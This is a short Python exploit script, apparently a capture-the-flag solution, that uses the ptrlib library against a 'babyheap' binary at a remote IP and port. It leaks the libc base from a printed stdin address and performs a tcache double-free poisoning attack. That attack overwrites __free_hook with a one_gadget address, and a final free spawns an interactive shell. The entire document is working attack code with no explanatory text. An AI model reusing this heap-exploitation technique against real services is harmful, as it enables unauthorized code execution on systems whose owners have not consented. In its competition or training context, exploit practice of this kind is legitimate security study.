from ptrlib import *

def alloc(data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("Content: ")
    sock.sendline(data)

def delete():
    sock.recvuntil("> ")
    sock.sendline("2")

def wipe():
    sock.recvuntil("> ")
    sock.sendline("3")
    
elf = ELF("./babyheap")
libc = ELF("./libc-2.27.so")
#sock = Process("./babyheap")
sock = Socket("133.242.68.223", 58396)
one_gadget = 0x4f322

sock.recvuntil(">>>>> ")
addr_stdin = int(sock.recvuntil(" "), 16)
libc_base = addr_stdin - libc.symbol("_IO_2_1_stdin_")
dump("libc base = " + hex(libc_base))

# tcache poisoning
alloc("Hello")
delete()
delete()
wipe()
payload = p64(libc_base + libc.symbol("__free_hook"))
alloc(payload)
wipe()
alloc("Hello")
wipe()
alloc(p64(libc_base + one_gadget))

# get the shell
delete()

sock.interactive()
